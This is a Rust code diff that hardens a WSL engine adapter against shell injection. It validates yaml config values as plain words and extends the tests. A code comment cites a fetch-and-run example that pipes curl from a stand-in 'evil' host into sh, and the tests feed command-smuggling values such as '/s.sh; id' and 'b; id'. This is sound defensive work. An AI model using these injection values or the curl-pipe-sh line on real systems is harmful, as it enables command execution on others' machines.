@@ -43,6 +43,18 @@ fn valid_container(name: &str) -> bool {
             .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
 }
 
+/// Whether `value` is safe to hand to WSL as a single word: the argv after
+/// `wsl.exe --` is re-tokenized by the login shell there, so a yaml value such as
+/// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
+/// review, 2026-10-26). Paths and profile names are plain words, never options.
+fn valid_word(value: &str) -> bool {
+    !value.is_empty()
+        && !value.starts_with('-')
+        && value.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@' | '~')
+        })
+}
+
 impl NinferAdapter {
     /// Creates the adapter with the config's WSL coordinates.
     pub fn new(wsl_distro: impl Into<String>, wsl_user: impl Into<String>) -> Self {
@@ -93,9 +105,9 @@ impl EngineAdapter for NinferAdapter {
             .map(|v| v.trim().to_string())
             .filter(|v| !v.is_empty())
             .ok_or_else(|| missing("ninfer_autostart"))?;
-        if script.starts_with('-') {
+        if !valid_word(&script) {
             return Err(rejected(format!(
-                "ninfer_autostart must be a script path, not an option: {script}"
+                "ninfer_autostart must be a plain WSL path (no spaces or shell metacharacters): {script}"
             )));
         }
         let container = model
@@ -113,8 +125,13 @@ impl EngineAdapter for NinferAdapter {
             .raw
             .get("ninfer_profile")
             .map(|v| v.trim().to_string())
-            .filter(|v| !v.is_empty() && !v.starts_with('-'))
+            .filter(|v| !v.is_empty())
             .unwrap_or_else(|| "b".to_string());
+        if !valid_word(&profile) {
+            return Err(rejected(format!(
+                "ninfer_profile must be a plain word (no spaces or shell metacharacters): {profile}"
+            )));
+        }
         let key = if model
             .raw
             .get("ninfer_key")
@@ -276,15 +293,36 @@ mod tests {
     }
 
     #[test]
-    fn option_shaped_values_are_refused_before_argv() {
+    fn option_and_shell_shaped_values_are_refused_before_argv() {
+        // The argv after `wsl.exe --` is re-tokenized by the login shell inside the
+        // distro, so a yaml value is only safe as a plain word (security review,
+        // 2026-10-26): option-shaped, spaced and metacharacter-bearing values die here.
+        for bad in ["-c", "/s.sh; id", "/s$(id).sh", "/s.sh|sh", "/a b.sh"] {
+            let err = NinferAdapter::new("Ubuntu", "legislat")
+                .spec(
+                    &entry(&[("ninfer_autostart", bad), ("ninfer_container", "c")]),
+                    18109,
+                )
+                .expect_err("script must be a plain path");
+            assert!(
+                matches!(&err, EngineError::Rejected { reason, .. }
+                    if reason.contains("plain WSL path")),
+                "{bad}: {err}"
+            );
+        }
         let err = NinferAdapter::new("Ubuntu", "legislat")
             .spec(
-                &entry(&[("ninfer_autostart", "-c"), ("ninfer_container", "c")]),
+                &entry(&[
+                    ("ninfer_autostart", "/s.sh"),
+                    ("ninfer_container", "c"),
+                    ("ninfer_profile", "b; id"),
+                ]),
                 18109,
             )
-            .expect_err("script cannot be an option");
+            .expect_err("profile must be a plain word");
         assert!(
-            matches!(&err, EngineError::Rejected { reason, .. } if reason.contains("script path")),
+            matches!(&err, EngineError::Rejected { reason, .. }
+                if reason.contains("ninfer_profile")),
             "{err}"
         );
         for name in ["-v", "_x", "a b"] {
